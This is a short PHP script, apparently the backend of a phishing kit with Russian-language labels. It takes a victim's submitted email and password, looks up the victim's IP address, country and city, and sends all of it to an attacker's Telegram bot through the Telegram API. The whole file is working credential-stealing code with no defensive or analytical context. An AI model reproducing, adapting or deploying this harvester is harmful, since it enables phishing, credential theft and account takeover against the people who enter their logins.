<?php
    require_once __DIR__ . '/../../config.php';

    $mass = $_POST['mass'];

    if ($mass == '') {
        return;
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
        $NowDomen = $_SERVER['SERVER_NAME'];
        $NowCountry = file_get_contents("https://ipapi.co/$ip/country_name/");
        $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
    
        $arr = array(
            "💸 Поздравляем, новый аккаунт!" => $emptyMess,
            "💵 Почта: " => $mass['emailAuth'],
            "🔑 Пароль: " => $mass['passwordAuth'],
            "🗻 IP: " => $ip,
            "🌍 Страна: " => $NowCountry,
            "🌇 Город: " => $NowCity,
            "🔧 Домен: " => $NowDomen
        );
    
        foreach($arr as $key => $value) {
          $txt .= "<b>".$key."</b> ".$value."%0A";
        };
      
        $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    };